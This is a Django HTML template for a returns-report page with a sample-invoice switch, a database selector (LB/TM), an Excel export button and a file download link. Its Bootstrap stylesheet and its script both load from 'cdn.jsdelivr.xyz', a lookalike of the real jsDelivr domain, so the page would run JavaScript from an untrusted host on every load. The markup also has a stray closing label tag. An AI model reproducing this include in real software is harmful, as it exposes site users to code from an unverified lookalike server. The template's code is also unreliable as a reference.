{% load static %}
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <title>Returns Report</title>
  </head>
  <body>
    <div class="container mt-5">
      <form action="" method="get">
        <div class="row">
          <div class="form-check form-switch col-sm-2">
            <input
              class="form-check-input"
              type="checkbox"
              role="switch"
              id="flexSwitchCheckChecked"
              name="samples"
              {% if sample_data %}
                checked
              {% endif %}
            />
            <label class="form-check-label" for="flexSwitchCheckChecked"></label>
            يتضمن فواتير عينات
            </label>
          </div>

          <div class="col-sm-2">
            <select class="form-select" name="db_name">
              <option value="LB"
            {% if db_name == "LB"  %}
              selected
            {% endif %}
            >LB</option>
              <option value="TM"
              {% if db_name == "TM"  %}
              selected
            {% endif %}
            >TM</option>
            </select>
           </div>

          <div class="col-sm-4">
            <button class="btn btn-primary" type="submit">Export Excel(ALL)</button>
          </div>
        </div>
      </form>
    </div>

    {% if input_data %}
    <div class="container">
      <div class="mt-3 text-center">
        <div class="card bg-light fs-4">
          <div class="card-body">
            You entered: {{ input_data }} | Sample Data : {{ sample_data }} | DB Name : {{ db_name }}
          </div>

          <div class="card-header">
            <a href="{% static fileName %}" download class="btn btn-success"
              >Download File For this Code
            </a>
          </div>
        </div>
      </div>
    </div>
    {% endif %}

    <hr><hr>
    <script src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
